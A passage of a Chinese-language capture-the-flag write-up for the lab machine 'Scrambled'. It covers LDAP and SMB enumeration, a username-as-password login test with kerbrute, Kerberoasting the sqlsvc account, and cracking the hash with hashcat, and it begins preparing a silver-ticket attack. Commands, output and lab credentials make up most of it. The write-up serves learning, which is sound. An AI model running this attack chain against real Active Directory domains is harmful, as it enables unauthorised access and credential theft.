ldap</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://10.10.11.168 -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=scrm,DC=local</span><br><span class="line">ldapServiceName: scrm.local:dc1$@SCRM.LOCAL</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=scrm,DC=local</span><br><span class="line">serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura</span><br><span class="line"> tion,DC=scrm,DC=local</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=scrm,DC=local</span><br><span class="line">namingContexts: DC=scrm,DC=local</span><br><span class="line">namingContexts: CN=Configuration,DC=scrm,DC=local</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=scrm,DC=local</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=scrm,DC=local</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=scrm,DC=local</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 290953</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C</span><br><span class="line"> N=Sites,CN=Configuration,DC=scrm,DC=local</span><br><span class="line">dnsHostName: DC1.scrm.local</span><br><span class="line">defaultNamingContext: DC=scrm,DC=local</span><br><span class="line">currentTime: 20250102081951.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=scrm,DC=local</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line">dc:DC1.scrm.local</span><br></pre></td></tr></table></figure>
+
+<h1 id="to-User"><a href="#to-User" class="headerlink" title="to User"></a>to User</h1><p>没有smb未授权等，突破口还是要再看看web</p>
+<p>首先就是他关掉了ntlm，所以后续操作我们都要先<code>gettgt</code>用tgt做。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-1.png" alt="alt text"></p>
+<p>而后是他们的管理对用户的密码重置习惯，重置过密码的用户，用户名就是密码.</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-2.png" alt="alt text"></p>
+<p>而后他们还有个应用，开启<code>debug</code>会在本地写入所有日志.</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-3.png" alt="alt text"></p>
+<p>最后还有IT支持团队的支持示例</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-4.png" alt="alt text"></p>
+<p>其中最后一张IT团队的图中，可以看到用户名是<code>ksimpson</code>，又因为他们会有重置后密码用户名相同的状况，拿这个用户名测试一下是否用户名密码相同。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ kerbrute bruteforce -d scrm.local user  --dc 10.10.11.168 </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 01/02/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/01/02 03:58:50 &gt;  Using KDC(s):</span><br><span class="line">2025/01/02 03:58:50 &gt;   10.10.11.168:88</span><br><span class="line"></span><br><span class="line">2025/01/02 03:58:50 &gt;  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson</span><br><span class="line">2025/01/02 03:58:50 &gt;  Done! Tested 1 logins (1 successes) <span class="keyword">in</span> 0.582 seconds</span><br></pre></td></tr></table></figure>
+
+<p>也确实是这个样子,这个用户估计被重置过吗，但是没有改默认的密码<code>ksimpson:ksimpson</code></p>
+<p>这里因为他把ntlm认证关了，所以用<code>impacket-getTGT</code>拿到tgt来做交互</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT &#x27;scrm.local/ksimpson:ksimpson&#x27; -dc-ip 10.10.11.168</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>export KRB5CCNAME=&lt;ccache path&gt;</code>导入票据（这个因为过于基础了所以我之前的wp好像有一部分没写）</p>
+<p>遛狗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─$ bloodhound.py -c All -d scrm.local -u ksimpson -p ksimpson -k -no-pass -ns 10.10.11.168 -dc dc1.scrm.local --zip --use-ldaps</span><br><span class="line">INFO: Found AD domain: scrm.local</span><br><span class="line">INFO: Using TGT from cache</span><br><span class="line">INFO: Found TGT with correct principal in ccache file.</span><br><span class="line">INFO: Connecting to LDAP server: dc1.scrm.local</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc1.scrm.local</span><br><span class="line">INFO: Found 16 users</span><br><span class="line">INFO: Found 62 groups</span><br><span class="line">INFO: Found 6 gpos</span><br><span class="line">INFO: Found 6 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: WS01.scrm.local</span><br><span class="line">INFO: Querying computer: DC1.scrm.local</span><br><span class="line">INFO: Done in 00M 29S</span><br><span class="line">INFO: Compressing output into 20250102042042_bloodhound.zip</span><br></pre></td></tr></table></figure>
+
+<p>顺带看一下smb，这里我想用<code>smbclient</code>，但是使用了<code>-k</code>krb来连接时会一直报错，所以我使用了<code>impacket-smbclient</code>，这次成功连接了，看来原生的<code>smbclient</code>我还是没玩明白。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-smbclient <span class="string">&#x27;scrm.local/ksimpson:ksimpson@dc1.scrm.local&#x27;</span> -k -dc-ip scrm.local          </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br><span class="line"> login &#123;domain/username,passwd&#125; - logs into the current SMB connection, no parameters <span class="keyword">for</span> NULL connection. If no password specified, it<span class="string">&#x27;ll be prompted</span></span><br><span class="line"><span class="string"> kerberos_login &#123;domain/username,passwd&#125; - logs into the current SMB connection using Kerberos. If no password specified, it&#x27;</span>ll be prompted. Use the DNS resolvable domain name</span><br><span class="line"> login_hash &#123;domain/username,lmhash:nthash&#125; - logs into the current SMB connection using the password hashes</span><br><span class="line"> logoff - logs off</span><br><span class="line"> shares - list available shares</span><br><span class="line"> use &#123;sharename&#125; - connect to an specific share</span><br><span class="line"> <span class="built_in">cd</span> &#123;path&#125; - changes the current directory to &#123;path&#125;</span><br><span class="line"> lcd &#123;path&#125; - changes the current <span class="built_in">local</span> directory to &#123;path&#125;</span><br><span class="line"> <span class="built_in">pwd</span> - shows current remote directory</span><br><span class="line"> password - changes the user password, the new password will be prompted <span class="keyword">for</span> input</span><br><span class="line"> <span class="built_in">ls</span> &#123;wildcard&#125; - lists all the files <span class="keyword">in</span> the current directory</span><br><span class="line"> lls &#123;<span class="built_in">dirname</span>&#125; - lists all the files on the <span class="built_in">local</span> filesystem.</span><br><span class="line"> tree &#123;filepath&#125; - recursively lists all files <span class="keyword">in</span> folder and sub folders</span><br><span class="line"> <span class="built_in">rm</span> &#123;file&#125; - removes the selected file</span><br><span class="line"> <span class="built_in">mkdir</span> &#123;<span class="built_in">dirname</span>&#125; - creates the directory under the current path</span><br><span class="line"> <span class="built_in">rmdir</span> &#123;<span class="built_in">dirname</span>&#125; - removes the directory under the current path</span><br><span class="line"> put &#123;filename&#125; - uploads the filename into the current path</span><br><span class="line"> get &#123;filename&#125; - downloads the filename from the current path</span><br><span class="line"> mget &#123;mask&#125; - downloads all files from the current directory matching the provided mask</span><br><span class="line"> <span class="built_in">cat</span> &#123;filename&#125; - reads the filename from the current path</span><br><span class="line"> mount &#123;target,path&#125; - creates a mount point from &#123;path&#125; to &#123;target&#125; (admin required)</span><br><span class="line"> umount &#123;path&#125; - removes the mount point at &#123;path&#125; without deleting the directory (admin required)</span><br><span class="line"> list_snapshots &#123;path&#125; - lists the vss snapshots <span class="keyword">for</span> the specified path</span><br><span class="line"> info - returns NetrServerInfo main results</span><br><span class="line"> <span class="built_in">who</span> - returns the sessions currently connected at the target host (admin required)</span><br><span class="line"> close - closes the current SMB Session</span><br><span class="line"> <span class="built_in">exit</span> - terminates the server process (and this session)</span><br></pre></td></tr></table></figure>
+
+<p>查看所有<code>sharename</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># shares </span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">HR</span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br></pre></td></tr></table></figure>
+
+<p>挨个尝试，打的时候忘记跑smbmap了，这里挨个试显得我有些笨，在<code>Public</code>里有东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># use Public</span><br><span class="line"># tree</span><br><span class="line">/Network Security Changes.pdf</span><br><span class="line">Finished - 0 files and folders</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..</span><br><span class="line">-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf</span><br></pre></td></tr></table></figure>
+
+<p>down下来，pdf中说，现在取消了所有的ntlm，改为了krb认证，其次是攻击者因为会从数据库中窃取凭证，所以取消了hr组对数据库的访问权限，改为只有<code>administrators</code>组才可以访问数据库。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-5.png" alt="alt text"></p>
+<p>简而言之就是数据库里有凭证怕泄露，所以只有<code>administrators</code>组里用户才能访问数据库.</p>
+<p>暂时没有什么头绪，我们正常搜点，用当前的用户跑一遍<code>getNPU</code>和<code>getUserSPNs</code></p>
+<p><code>getNPU</code>没有什么产出，但是<code>getUserSPNs</code>确有了收获，得到了<code>sqlsvc</code>的<code>tgs</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip 10.10.11.168 -dc-host dc1.scrm.local  -request</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">----------------------------  ------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-01-02 04:18:41.272081             </span><br><span class="line">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-01-02 04:18:41.272081             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$512edc4e4....</span><br></pre></td></tr></table></figure>
+
+<p>尝试跑一下，就得到了账号密码<code>sqlsvc:Pegasus60</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ hashcat svc_sql_hash /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect <span class="built_in">hash</span> mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input <span class="built_in">hash</span>:</span><br><span class="line"></span><br><span class="line">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the <span class="built_in">hash</span> <span class="built_in">type</span>.</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*sqlsvc<span class="variable">$SCRM</span>.LOCAL<span class="variable">$scrm</span>.<span class="built_in">local</span>/sqlsvc*<span class="variable">$512edc4e41</span>...:Pegasus60</span><br></pre></td></tr></table></figure>
+
+<p>居然我们拿到了<code>MSSQL</code>的服务账户的密码，那就可以来制作<code>银票</code>，通过伪造<code>administrator</code>的<code>tgs</code>来访问<code>mssql</code></p>
+<p>可以参考下文</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</a></p>
+</blockquote>
+<p><strong>重点需要：域sid、伪造目标用户的sid、服务账号的nthash</strong></p>
+<p>首先搞一下<code>administrator</code>的<code>sid</code>，这里方法很多，用looksid、powerview、ldap、getpac、狗图等等都可以，但是，这里我在<code>0xdf</code>的wp中找到了困扰我已久的<code>ldaps</code>连接凭证报错问题，所以会简单记录一下<code>ldaps</code>配置的过程。</p>
+<h1 id="ldaps"><a href="#ldaps" class="headerlink" title="ldaps"></a>ldaps</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html#ldap---tcp-389">https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html#ldap---tcp-389</a></p>
+</blockquote>
+<p>说白了还是需要配置一个客户端证书</p>
+<p>所以首先要获取客户端证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">└─$ openssl s_client -host dc1.scrm.local  -connect dc1.scrm.local:636</span><br><span class="line">Connecting to 10.10.11.168</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0</span><br><span class="line">verify error:num=20:unable to get <span class="built_in">local</span> issuer certificate</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0</span><br><span class="line">verify error:num=21:unable to verify the first certificate</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:</span><br><span class="line">   i:DC=<span class="built_in">local</span>, DC=scrm, CN=scrm-DC1-CA</span><br><span class="line">   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1</span><br><span class="line">   v:NotBefore: Sep  4 11:14:45 2024 GMT; NotAfter: Jun  8 22:39:53 2121 GMT</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIFtzCCBJ+gAwIBAgITEgAAAAWd33nJkSGX4QAAAAAABTANBgkqhkiG9w0BAQUF</span><br><span class="line">ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt</span><br><span class="line">MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAgFw0yNDA5MDQxMTE0NDVaGA8yMTIxMDYw</span><br><span class="line">ODIyMzk1M1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7APeOI</span><br><span class="line">QpFcy0JhCXiFe+YukkzyogwrXQG4jwuUqVtnzI0qKsJ2HKdvOLp5W+Fc4RwFdNMU</span><br><span class="line">q3cVCiwRMDdgsZbDull+e8s8kNmdBNNqcaHFwKXYbdWiXR2aBysPf9Gzs3iWllhs</span><br><span class="line">Ja1ihbrArixe2471/rjohLiz8VVssVQqUm8KjcO/jRFOLd2y1MtQPoOhTQtDasFT</span><br><span class="line">SceuhHLAe7RHygnndnyo2Sb+O0Neaeq0YDdc9zU5yjGilpJUYKYB36z32IOfEdJ8</span><br><span class="line">OJr1iqg9oFZ0KKqskm5YT6PhFZFwpSAn4Re8xTfBOglopFn/mEBTh7ibLXL25K5/</span><br><span class="line">H4ve2hiQIPsD0rECAwEAAaOCAuMwggLfMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB</span><br><span class="line">gjcVCIaj2B2B69kvgd2ZGYSm9EaL4D9SARwCAW4CAQIwKQYDVR0lBCIwIAYIKwYB</span><br><span class="line">BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICMA4GA1UdDwEB/wQEAwIFoDA1Bgkr</span><br><span class="line">BgEEAYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisGAQQBgjcU</span><br><span class="line">AgIwHQYDVR0OBBYEFBRGx6zDOGOtjPPvaoLO36fByJ5LMB8GA1UdIwQYMBaAFAhp</span><br><span class="line">QhkKLZ9wcDY0RhznHYYVm2iSMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw</span><br><span class="line">Oi8vL0NOPXNjcm0tREMxLUNBLENOPURDMSxDTj1DRFAsQ049UHVibGljJTIwS2V5</span><br><span class="line">JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zY3Jt</span><br><span class="line">LERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD</span><br><span class="line">bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvAYIKwYBBQUHAQEEga8wgawwgakG</span><br><span class="line">CCsGAQUFBzAChoGcbGRhcDovLy9DTj1zY3JtLURDMS1DQSxDTj1BSUEsQ049UHVi</span><br><span class="line">bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv</span><br><span class="line">bixEQz1zY3JtLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz</span><br><span 